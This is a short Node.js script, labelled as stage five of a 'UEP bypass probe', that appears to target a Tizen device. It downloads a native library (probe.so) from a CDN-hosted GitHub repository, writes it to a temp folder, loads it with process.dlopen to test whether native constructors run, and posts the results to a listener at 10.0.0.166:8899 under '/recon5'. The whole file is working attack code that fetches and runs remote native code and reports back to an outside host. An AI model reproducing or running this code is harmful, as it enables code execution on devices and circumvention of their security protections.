// Stage-5: test whether process.dlopen runs native constructors (UEP bypass probe).
var fs = require('fs');
var http = require('http');
var https = require('https');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon5', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v9/probe.so', function (r) {
  var c = [];
  r.on('data', function (d) { c.push(d); });
  r.on('end', function () {
    var buf = Buffer.concat(c);
    var out = {};
    if (!buf || buf.length < 100) { post({ err: 'fetch' }); return; }
    var p = '/home/owner/share/tmp/probe.so';
    try { fs.writeFileSync(p, buf); } catch (e) { post({ err: 'write ' + e.message }); return; }
    try { fs.unlinkSync('/home/owner/share/tmp/dlopen_ok'); } catch (e) { }
    try { process.dlopen({ exports: {} }, p); out.dlopen = 'returned'; } catch (e) { out.dlopen = 'threw: ' + e.message; }
    try { out.marker = fs.readFileSync('/home/owner/share/tmp/dlopen_ok', 'utf8'); } catch (e) { out.marker = 'absent'; }
    post(out);
  });
}).on('error', function (e) { post({ err: 'https ' + e.message }); });
